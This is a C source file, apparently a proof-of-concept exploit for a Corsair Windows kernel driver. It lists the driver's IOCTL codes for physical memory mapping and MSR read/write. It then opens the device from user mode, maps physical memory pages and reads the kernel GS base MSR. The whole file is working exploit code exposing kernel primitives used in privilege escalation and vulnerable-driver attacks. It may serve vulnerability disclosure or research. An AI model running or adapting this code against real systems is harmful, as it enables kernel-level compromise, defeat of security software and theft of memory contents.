#include <Windows.h>
#include <stdio.h>

/*
* MAP IO SPACE
* 
* IOCTL CODE: 0x225374
* INPUT: (This Struct)
* OUTPUT: PVOID which holds mapped address
*/
typedef struct
{
	//PHYSICAL_ADDRESS
	LARGE_INTEGER Base;
	ULONG Size;
} MAP_IO_SPACE_PARAMS;

/*
* UNMAP IO SPACE
* 
* IOCTL CODE: 0x229378
* INPUT: PVOID of mapped io space
* OUTPUT: PVOID of mapped io space (OPTIONAL)
*/

/*
* WRITE MSR
* 
* IOCTL CODE: 0x229384
* INPUT: (This Struct)
* OUTPUT: (Dunno)
*/
typedef struct
{
	ULONG MsrIndex;
	ULONG_PTR Value;
} WRITE_MSR_PARAMS;

/*
* READ MSR
* 
* IOCTL CODE: 0x225388
* INPUT: ULONG_PTR with MSR index value
* OUTPUT: ULONG_PTR with MSR value
*/

int main()
{
	_putws(L"[Begin exploits]\n");

	/* Device name is the same as the installed service name
	   Everyone has all access, however, upon open driver
	   checks token integrity level. Therefore only admin
	   can successfully open the device. */
	HANDLE hDevice = CreateFileW(L"\\\\.\\CORSAIREXPLOIT", FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		wprintf(L"Open error: %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	/* MmMapIoSpace() calls from usermode */

	PVOID mapBase;
	DWORD returnedBytes;
	MAP_IO_SPACE_PARAMS params;
	params.Base.QuadPart = 0;
	params.Size = 0x1000;
	for (int i = 0; i <= 10; ++i, params.Base.QuadPart += 0x1000) {

		if (!DeviceIoControl(hDevice, 0x225374, &params,
			sizeof(MAP_IO_SPACE_PARAMS), &mapBase, sizeof(PVOID),
			&returnedBytes, NULL)) {
			wprintf(L"MAP_IO_SPACE IOCTL Error: %d\n", GetLastError());
			break;
		}
		wprintf(L"Mapped 4KB Physical Memory @ 0x%p to 0x%p\n",
			(PVOID)params.Base.QuadPart, mapBase);
		DeviceIoControl(hDevice, 0x229378, &mapBase, sizeof(PVOID),
			NULL, 0, &returnedBytes, NULL);
	}

	/* Read/write MSRs from usermode */

	ULONG_PTR gsBaseValue, nMsr = 0xC0000101;
	if (!DeviceIoControl(hDevice, 0x225388, &nMsr, sizeof(ULONG_PTR),
		&gsBaseValue, sizeof(ULONG_PTR), &returnedBytes, NULL)) {
		wprintf(L"READ_MSR IOCTL Error: %d\n", GetLastError());
		CloseHandle(hDevice);
		return EXIT_FAILURE;
	}

	wprintf(L"\nKernel GS base value: 0x%p\n\n", (PVOID)gsBaseValue);
	_putws(L"[End exploits]");

	return 0;
}
